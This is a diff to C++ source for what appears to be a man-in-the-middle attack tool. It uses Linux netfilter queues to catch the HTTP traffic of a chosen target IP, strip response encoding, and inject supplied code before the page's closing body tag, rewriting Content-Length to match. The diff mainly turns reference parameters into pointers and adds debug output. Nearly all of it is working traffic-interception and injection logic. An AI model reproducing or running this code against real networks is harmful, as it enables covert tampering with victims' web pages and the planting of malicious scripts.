@@ -141,9 +141,9 @@ static int RemoveEncoding(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, u
 }
 
 static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint32_t payloadLen, 
-    CHaks::NetFilterCallbackData& callbackData)
+    CHaks::NetFilterCallbackData* callbackData)
 {
-    uint32_t bufferLen = payloadLen + callbackData.codeLen + 1;
+    uint32_t bufferLen = payloadLen + callbackData->codeLen + 1;
     char* buffer = (char*)malloc(bufferLen);
     memset(buffer, '\0', bufferLen);
     memcpy(buffer, payload, payloadLen);
@@ -155,12 +155,22 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
             buffer[i] = std::toupper(buffer[i]);
     }
 
+    std::cout << "buffer converted to uppercase\n";
+
     int contentLengthStartIndex = PacketCraft::FindInStr(buffer, "CONTENT-LENGTH: ") + 16;
     int contentLengthEndIndex = PacketCraft::FindInStr(buffer + contentLengthStartIndex, "\r\n");
     int contentLenStrSize = contentLengthEndIndex - contentLengthStartIndex;
+
+    std::cout << "contentLengthStartIndex: " << contentLengthStartIndex << ", contentLengthEndIndex: " << contentLengthEndIndex << "\n";
+    std::cout << "content len str size calculated: " << contentLenStrSize << "\n";
+    // 1 2 0 0
+    // . . . . .
     char* contentLenStr = (char*)malloc(contentLenStrSize + 1);
     memcpy(contentLenStr, buffer + contentLengthStartIndex, contentLenStrSize);
     contentLenStr[contentLenStrSize] = '\0';
+
+    std::cout << "contentLenStr (" << contentLenStr << ") received\n";
+
     int contentLen = atoi(contentLenStr);
     if(contentLen <= 0)
     {
@@ -171,7 +181,7 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
     }
 
     char newContentLenStr[64]{};
-    snprintf(newContentLenStr, 64, "%d\r\n", callbackData.codeLen + contentLen);
+    snprintf(newContentLenStr, 64, "%d\r\n", callbackData->codeLen + contentLen);
     int newContentLen = atoi(newContentLenStr);
     if(newContentLen <= 0)
     {
@@ -180,6 +190,8 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
         free(buffer);
         return APPLICATION_ERROR;
     }
+
+    std::cout << "new content len string received\n";
 
     int codeStartIndex = PacketCraft::FindInStr(buffer, "</BODY>");
     if(codeStartIndex == -1)
@@ -190,6 +202,8 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
         return APPLICATION_ERROR;
     }
 
+    std::cout << "code start index received\n";
+
     char* bufferPtr = buffer;
     char* payloadPtr = payload;
     memset(buffer, '\0', bufferLen);   
@@ -199,22 +213,33 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
     bufferPtr += contentLengthStartIndex;
     payloadPtr += contentLengthEndIndex + 2;
 
+    std::cout << "copied until Content-Length value\n";
+
     // copy the new content length value 
     memcpy(bufferPtr, newContentLenStr, PacketCraft::GetStrLen(newContentLenStr));
     bufferPtr += PacketCraft::GetStrLen(newContentLenStr);
+
+    std::cout << "copided new content len value\n";
 
     // copy evething up until </body> tag (</body> excluded)
     memcpy(bufferPtr, payloadPtr, codeStartIndex - (contentLengthEndIndex + 2));
     bufferPtr += codeStartIndex - (contentLengthEndIndex + 2);
     payloadPtr = payload + codeStartIndex;
 
+    std::cout << "copied everything until </body> tag\n";
+
     // copy the code into the buffer
-    memcpy(bufferPtr, callbackData.code, callbackData.codeLen);
-    bufferPtr += callbackData.codeLen;
+    memcpy(bufferPtr, callbackData->code, callbackData->codeLen);
+    bufferPtr += callbackData->codeLen;
+
+    std::cout << "copied code into buffer\n";
 
     // copy everything else from the payload starting at the </body> tag
     memcpy(bufferPtr, payloadPtr, payloadLen - codeStartIndex);
 
+    std::cout << "copied all the rest\n";
+
+    std::cout << "mangling...\n";
 
     if(ipVersion == AF_INET)
     {
@@ -279,13 +304,13 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
 
  // returns -1 on error, 1 when packet does not match criteria, 0 when the correct packet is found and processed
  int ProcessRequest(uint32_t ipVersion, iphdr* ipv4Header, ip6_hdr* ipv6Header,  tcphdr* tcpHeader, char* tcpPayload, 
-    uint32_t tcpPayloadLen, CHaks::NetFilterCallbackData& callbackData)
+    uint32_t tcpPayloadLen, CHaks::NetFilterCallbackData* callbackData)
  {
     // Filter for a matching IP
     if(ipVersion == AF_INET)
     {
         sockaddr_in targetAddr{};
-        if(inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr) != 1)
+        if(inet_pton(AF_INET, callbackData->targetIPStr, &targetAddr.sin_addr) != 1)
         {
             LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
             return -1;
@@ -297,7 +322,7 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
     else if(ipVersion == AF_INET6)
     {
         sockaddr_in6 targetAddr{};
-        if(inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr) != 1)
+        if(inet_pton(AF_INET6, callbackData->targetIPStr, &targetAddr.sin6_addr) != 1)
         {
             LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
             return -1;
@@ -308,12 +333,12 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
     }
     //////////
 
-    if(FilterReq(callbackData.url, tcpHeader, (char*)tcpPayload, clientAckNum) == TRUE)
+    if(FilterReq(callbackData->url, tcpHeader, (char*)tcpPayload, clientAckNum) == TRUE)
     {
         std::cout << "request filtered\n";
         if(ipVersion == AF_INET)
         {
-            if(inet_ntop(AF_INET, &ipv4Header->daddr, callbackData.serverIPStr, INET6_ADDRSTRLEN) == nullptr)
+            if(inet_ntop(AF_INET, &ipv4Header->daddr, callbackData->serverIPStr, INET_ADDRSTRLEN) == nullptr)
             {
                 LOG_ERROR(APPLICATION_ERROR, "inet_ntop() error");
                 return -1;
@@ -321,14 +346,14 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
         }
         else
         {
-            if(inet_ntop(AF_INET6, &ipv6Header->ip6_dst, callbackData.serverIPStr, INET6_ADDRSTRLEN) == nullptr)
+            if(inet_ntop(AF_INET6, &ipv6Header->ip6_dst, callbackData->serverIPStr, INET6_ADDRSTRLEN) == nullptr)
             {
                 LOG_ERROR(APPLICATION_ERROR, "inet_ntop() error");
                 return -1;
             }
         }
 
-        std::cout << "serverIP (" << callbackData.serverIPStr << ") saved\n";
+        std::cout << "serverIP (" << callbackData->serverIPStr << ") saved\n";
 
         return 0;
     }
@@ -339,20 +364,20 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
 // returns 0 if traffic of the correct tcp flow is coming from the client, 1 if it's coming from the server, and 2
 // if neither. returns - 1 on error. global client and server ack/seq nums are also set
 static int FilterIPAndTCP(uint32_t ipVersion, iphdr* ipv4Header, ip6_hdr* ipv6Header, tcphdr* tcpHeader, 
-    CHaks::NetFilterCallbackData& callbackData)
+    CHaks::NetFilterCallbackData* callbackData)
 {
     // Filter for a matching client packet based on IP
     if(ipVersion == AF_INET)
     {
         sockaddr_in targetAddr{};
-        if(inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr) != 1)
+        if(inet_pton(AF_INET, callbackData->targetIPStr, &targetAddr.sin_addr) != 1)
         {
             LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
             return -1;
         }
 
         sockaddr_in serverAddr{};
-        if(inet_pton(AF_INET, callbackData.serverIPStr, &serverAddr.sin_addr) != 1)
+        if(inet_pton(AF_INET, callbackData->serverIPStr, &serverAddr.sin_addr) != 1)
         {
             LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
             return -1; 
@@ -382,14 +407,14 @@ static int FilterIPAndTCP(uint32_t ipVersion, iphdr* ipv4Header, ip6_hdr* ipv6He
     else if(ipVersion == AF_INET6)
     {
         sockaddr_in6 targetAddr{};
-        if(inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr) != 1)
+        if(inet_pton(AF_INET6, callbackData->targetIPStr, &targetAddr.sin6_addr) != 1)
         {
             LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
             return -1;
         }
 
         sockaddr_in6 serverAddr{};
-        if(inet_pton(AF_INET6, callbackData.serverIPStr, &serverAddr.sin6_addr) != 1)
+        if(inet_pton(AF_INET6, callbackData->serverIPStr, &serverAddr.sin6_addr) != 1)
         {
             LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
             return -1;
@@ -430,7 +455,7 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
     nlattr* attr[NFQA_MAX + 1]{};
     nfgenmsg*nfg{nullptr};
 
-    CHaks::NetFilterCallbackData callbackData = *(CHaks::NetFilterCallbackData*)data;
+    CHaks::NetFilterCallbackData* callbackData = (CHaks::NetFilterCallbackData*)data;
 
     if(nfq_nlmsg_parse(nlh, attr) < 0) 
     {
@@ -534,7 +559,7 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
     // any packet that has no tcp layer will be allowed through
     if(hasTCPLayer == FALSE)
     {
-        if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
+        if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData->nl, pkBuff) == APPLICATION_ERROR)
         {
             LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
             return MNL_CB_ERROR;
@@ -596,12 +621,14 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
                 res = PacketCraft::FindInStr((char*)tcpPayload, "</body>");
                 if(res > -1)
                 {
+                    std::cout << "</body> tag found. Injecting code...\n";
                     if(InjectCode(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen, callbackData) == APPLICATION_ERROR)
                     {
                         pktb_free(pkBuff);
                         LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
                         return MNL_CB_ERROR;
                     }
+                    std::cout << "code injected\n";
                 }
             }
         }
@@ -621,7 +648,7 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
         }
     }
 
-    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
+    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData->nl, pkBuff) == APPLICATION_ERROR)
     {
         LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
         return MNL_CB_ERROR;
